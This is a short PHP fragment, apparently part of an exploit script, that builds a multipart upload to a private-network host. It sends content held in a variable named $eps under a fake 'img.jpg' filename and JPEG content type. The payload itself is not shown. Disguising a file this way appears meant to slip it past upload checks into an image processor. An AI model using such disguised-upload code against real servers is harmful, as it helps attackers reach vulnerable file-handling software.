$boundary = "----WebKitFormBoundary" . md5(time());
$body = "--$boundary\r\n";
$body .= "Content-Disposition: form-data; name=\"file_upload\"; filename=\"img.jpg\"\r\n";
$body .= "Content-Type: image/jpeg\r\n\r\n";
$body .= $eps;
$body .= "\r\n--$boundary--\r\n";

$fp = fsockopen("10.10.1.2", 8080, $errno, $errstr, 5);
if (!$fp) { die("Connect: $errno - $errstr"); }
$request = "POST / HTTP/1.0\r\nHost: 10.10.1.2:8080\r\nContent-Type: multipart/form-data; boundary=$boundary\r\nContent-Length: " . strlen($body) . "\r\nConnection: close\r\n\r\n$body";
